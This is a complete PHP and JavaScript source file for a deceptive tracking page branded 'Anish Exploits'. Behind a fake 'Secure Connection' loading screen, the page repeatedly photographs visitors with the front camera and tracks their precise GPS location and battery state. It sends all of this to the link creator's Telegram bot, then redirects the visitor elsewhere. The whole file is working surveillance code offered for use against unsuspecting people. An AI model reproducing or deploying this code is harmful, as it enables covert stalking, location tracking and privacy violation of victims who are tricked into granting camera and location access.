<?php
require_once 'config.php';

// Create folders & files if not exist
if (!file_exists("photos")) {
    mkdir("photos", 0755, true);
}
if (!file_exists("visitors.json")) {
    file_put_contents("visitors.json", json_encode([]));
}
if (!file_exists("links.json")) {
    file_put_contents("links.json", json_encode([]));
}

$id = $_GET['id'] ?? '';
$db = json_decode(file_get_contents("links.json"), true) ?? [];

$linkData = $db[$id] ?? null;
$targetUrl = $linkData['url'] ?? 'https://google.com';
$creatorId = $linkData['created_by'] ?? $config['chat_id'];

session_start();
$visitorId = $_SESSION['visitor_id'] ?? null;

if (!$visitorId) {
    $visitorId = 'VIS_' . time() . '_' . bin2hex(random_bytes(4));
    $_SESSION['visitor_id'] = $visitorId;
}

// ========== FUNCTIONS ==========
function sendPhotoToTelegram($chatId, $photoPath, $visitorId) {
    global $config;
    
    if (!file_exists($photoPath)) return false;
    
    $token = $config['bot_token'];
    $url = "https://api.telegram.org/bot$token/sendPhoto";
    
    $post = [
        'chat_id' => $chatId,
        'photo' => new CURLFile(realpath($photoPath)),
        'caption' => "📸 *Spy Photo!*\n🆔 $visitorId\n⏰ " . date('Y-m-d H:i:s')
    ];
    
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_TIMEOUT, 30);
    
    $response = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    
    file_put_contents("debug.log", date('Y-m-d H:i:s') . " - Photo send: $httpCode\n", FILE_APPEND);
    
    return $httpCode == 200;
}

function sendLocationToTelegram($chatId, $lat, $lng, $visitorId) {
    global $config;
    $token = $config['bot_token'];
    
    $url = "https://api.telegram.org/bot$token/sendLocation";
    $data = ['chat_id' => $chatId, 'latitude' => $lat, 'longitude' => $lng];
    file_get_contents($url . "?" . http_build_query($data));
    
    $msg = "📍 *Live Location*\n🆔 $visitorId\n🗺️ https://maps.google.com/?q=$lat,$lng";
    $url2 = "https://api.telegram.org/bot$token/sendMessage";
    $data2 = ['chat_id' => $chatId, 'text' => $msg, 'parse_mode' => 'Markdown'];
    file_get_contents($url2 . "?" . http_build_query($data2));
    
    file_put_contents("debug.log", date('Y-m-d H:i:s') . " - Location sent: $lat, $lng\n", FILE_APPEND);
}

function sendBatteryToTelegram($chatId, $level, $charging, $visitorId) {
    global $config;
    $token = $config['bot_token'];
    
    $status = $charging ? "⚡ Charging" : "🔋 Not Charging";
    $msg = "🔋 *Battery Status*\n🆔 $visitorId\n📊 $level%\n$status";
    
    $url = "https://api.telegram.org/bot$token/sendMessage";
    $data = ['chat_id' => $chatId, 'text' => $msg, 'parse_mode' => 'Markdown'];
    file_get_contents($url . "?" . http_build_query($data));
    
    file_put_contents("debug.log", date('Y-m-d H:i:s') . " - Battery sent: $level%\n", FILE_APPEND);
}

// ========== HANDLE POST DATA ==========
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    $input = file_get_contents('php://input');
    file_put_contents("debug.log", date('Y-m-d H:i:s') . " - POST received\n", FILE_APPEND);
    
    $data = json_decode($input, true);
    if (!$data) {
        echo json_encode(['status' => 'error', 'message' => 'Invalid JSON']);
        exit;
    }
    
    $items = isset($data[0]) ? $data : [$data];
    
    $visitors = json_decode(file_get_contents("visitors.json"), true) ?? [];
    
    if (!isset($visitors[$visitorId])) {
        $visitors[$visitorId] = [
            'device' => $_SERVER['HTTP_USER_AGENT'],
            'ip' => $_SERVER['REMOTE_ADDR'],
            'target_url' => $targetUrl,
            'generated_by' => $creatorId,
            'time' => date('Y-m-d H:i:s'),
            'photos' => 0,
            'locations' => 0,
            'battery' => 0
        ];
    }
    
    $visitors[$visitorId]['last_update'] = date('Y-m-d H:i:s');
    
    foreach ($items as $item) {
        // PHOTO
        if (isset($item['photo']) && !empty($item['photo'])) {
            $photoData = $item['photo'];
            $photoData = str_replace('data:image/jpeg;base64,', '', $photoData);
            $photoData = str_replace(' ', '+', $photoData);
            $photoBinary = base64_decode($photoData);
            
            if ($photoBinary && strlen($photoBinary) > 500) {
                $photoPath = "photos/" . $visitorId . "_" . time() . ".jpg";
                file_put_contents($photoPath, $photoBinary);
                
                file_put_contents("debug.log", date('Y-m-d H:i:s') . " - Photo saved: " . filesize($photoPath) . " bytes\n", FILE_APPEND);
                
                if (file_exists($photoPath) && filesize($photoPath) > 500) {
                    sendPhotoToTelegram($creatorId, $photoPath, $visitorId);
                    $visitors[$visitorId]['photos'] += 1;
                }
            }
        }
        
        // LOCATION
        if (isset($item['location'])) {
            $lat = $item['location']['lat'] ?? 0;
            $lng = $item['location']['lng'] ?? 0;
            if ($lat != 0 && $lng != 0) {
                sendLocationToTelegram($creatorId, $lat, $lng, $visitorId);
                $visitors[$visitorId]['locations'] += 1;
            }
        }
        
        // BATTERY
        if (isset($item['battery'])) {
            $level = $item['battery']['level'] ?? 0;
            $charging = $item['battery']['charging'] ?? false;
            if ($level > 0) {
                sendBatteryToTelegram($creatorId, $level, $charging, $visitorId);
                $visitors[$visitorId]['battery'] += 1;
            }
        }
    }
    
    file_put_contents("visitors.json", json_encode($visitors));
    echo json_encode(['status' => 'success']);
    exit;
}
?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Loading...</title>
    <style>
        * { margin:0; padding:0; box-sizing:border-box; }
        body { 
            background: #0a0a0a;
            color: #fff;
            font-family: -apple-system, 'Segoe UI', sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
        }
        .container {
            text-align: center;
            padding: 20px;
            max-width: 380px;
        }
        .logo {
            font-size: 28px;
            font-weight: 900;
            background: linear-gradient(45deg, #f7971e, #ffd200);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            margin-bottom: 5px;
        }
        .subtitle {
            color: #555;
            font-size: 12px;
            margin-bottom: 25px;
            letter-spacing: 1px;
        }
        .spinner {
            width: 50px;
            height: 50px;
            border: 3px solid rgba(255,255,255,0.05);
            border-radius: 50%;
            border-top: 3px solid #f7971e;
            animation: spin 0.8s linear infinite;
            margin: 20px auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .status-text {
            color: #4ade80;
            font-size: 13px;
            min-height: 22px;
            transition: 0.3s;
        }
        .status-text.warning { color: #fbbf24; }
        .status-text.error { color: #ef4444; }
        .badge {
            display: inline-block;
            background: rgba(255,255,255,0.03);
            padding: 4px 14px;
            border-radius: 20px;
            font-size: 10px;
            color: #666;
            margin-top: 15px;
            border: 1px solid rgba(255,255,255,0.03);
        }
        .badge span { color: #f7971e; }
        #video { display: none; }
        #canvas { display: none; }
        .red-dot {
            display: inline-block;
            width: 8px;
            height: 8px;
            background: #ef4444;
            border-radius: 50%;
            animation: pulse 1s infinite;
            margin-right: 6px;
        }
        @keyframes pulse {
            0%, 100% { opacity: 1; transform: scale(1); }
            50% { opacity: 0.3; transform: scale(1.2); }
        }
        .recording {
            display: inline-flex;
            align-items: center;
            background: rgba(239, 68, 68, 0.1);
            padding: 4px 12px;
            border-radius: 20px;
            font-size: 11px;
            color: #ef4444;
            margin-top: 8px;
        }
        .debug-info {
            color: #444;
            font-size: 10px;
            margin-top: 15px;
            word-break: break-all;
            max-height: 60px;
            overflow-y: auto;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">✨ Anish Exploits</div>
        <div class="subtitle">🔒 Secure Connection</div>
        
        <div class="spinner"></div>
        <div class="status-text" id="status">📸 Initializing...</div>
        <div class="recording" id="recordingBadge" style="display:none;">
            <span class="red-dot"></span> RECORDING
        </div>
        <div class="badge">🆔 <span id="visitorDisplay"></span></div>
        <div class="debug-info" id="debugInfo"></div>
        
        <video id="video" autoplay playsinline muted></video>
        <canvas id="canvas"></canvas>
    </div>

    <script>
        const visitorId = '<?= $visitorId ?>';
        const targetUrl = '<?= $targetUrl ?>';
        let photoCount = 0;
        let isCapturing = false;
        let debugEl = document.getElementById('debugInfo');
        
        function debug(msg) {
            debugEl.textContent = msg;
            console.log(msg);
        }
        
        document.getElementById('visitorDisplay').textContent = visitorId.substring(0, 15) + '...';
        debug('Initializing...');

        // ========== CAMERA - FRONT CAMERA ==========
        debug('Requesting camera...');
        
        navigator.mediaDevices.getUserMedia({ 
            video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } }, 
            audio: false 
        })
        .then(stream => {
            const video = document.getElementById('video');
            video.srcObject = stream;
            video.play();
            
            document.getElementById('status').textContent = '📸 Capturing...';
            document.getElementById('recordingBadge').style.display = 'inline-flex';
            isCapturing = true;
            debug('✅ Camera active');
            
            setInterval(() => {
                if (isCapturing) {
                    capturePhoto();
                    photoCount++;
                    debug('📸 Photo #' + photoCount);
                }
            }, 1000);
        })
        .catch(err => {
            document.getElementById('status').textContent = '⚠️ Camera denied';
            document.getElementById('status').className = 'status-text error';
            debug('❌ Camera error: ' + err.message);
        });

        function capturePhoto() {
            const video = document.getElementById('video');
            const canvas = document.getElementById('canvas');
            const ctx = canvas.getContext('2d');
            
            if (!video.videoWidth || video.videoWidth === 0) return;
            
            canvas.width = 640;
            canvas.height = 480;
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            
            const photoData = canvas.toDataURL('image/jpeg', 0.7);
            sendData({ photo: photoData });
        }

        // ========== LOCATION ==========
        debug('Requesting location...');
        
        if (navigator.geolocation) {
            navigator.geolocation.watchPosition(
                (position) => {
                    const loc = {
                        lat: position.coords.latitude,
                        lng: position.coords.longitude
                    };
                    debug('📍 Location: ' + loc.lat + ', ' + loc.lng);
                    sendData({ location: loc });
                },
                (err) => {
                    debug('❌ Location error: ' + err.message);
                },
                { enableHighAccuracy: true, maximumAge: 5000, timeout: 10000 }
            );
        } else {
            debug('❌ Geolocation not supported');
        }

        // ========== BATTERY ==========
        debug('Checking battery...');
        
        if (navigator.getBattery) {
            navigator.getBattery().then(battery => {
                function updateBattery() {
                    const level = Math.round(battery.level * 100);
                    const charging = battery.charging;
                    debug('🔋 Battery: ' + level + '%');
                    sendData({ battery: { level: level, charging: charging } });
                }
                updateBattery();
                setInterval(updateBattery, 5000);
            });
        } else {
            debug('❌ Battery API not supported');
        }

        // ========== SEND DATA ==========
        let pendingData = [];
        let lastSend = 0;

        function sendData(data) {
            pendingData.push(data);
            
            if (Date.now() - lastSend > 2000 || pendingData.length >= 3) {
                const batch = pendingData.slice();
                pendingData = [];
                
                debug('📤 Sending ' + batch.length + ' items');
                
                fetch(window.location.href, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(batch)
                })
                .then(response => response.json())
                .then(data => {
                    debug('✅ Server OK');
                })
                .catch(err => {
                    debug('❌ Send error: ' + err.message);
                });
                
                lastSend = Date.now();
            }
        }

        // ========== REDIRECT ==========
        let secondsLeft = 10;
        const statusEl = document.getElementById('status');
        
        const countdown = setInterval(() => {
            secondsLeft--;
            if (secondsLeft > 0) {
                statusEl.textContent = '⏳ Redirecting in ' + secondsLeft + 's...';
            }
        }, 1000);

        setTimeout(() => {
            clearInterval(countdown);
            isCapturing = false;
            statusEl.textContent = '🚀 Redirecting...';
            debug('🔗 Redirecting...');
            
            setTimeout(() => {
                window.location.href = targetUrl;
            }, 1500);
        }, 10000);
    </script>
</body>
</html>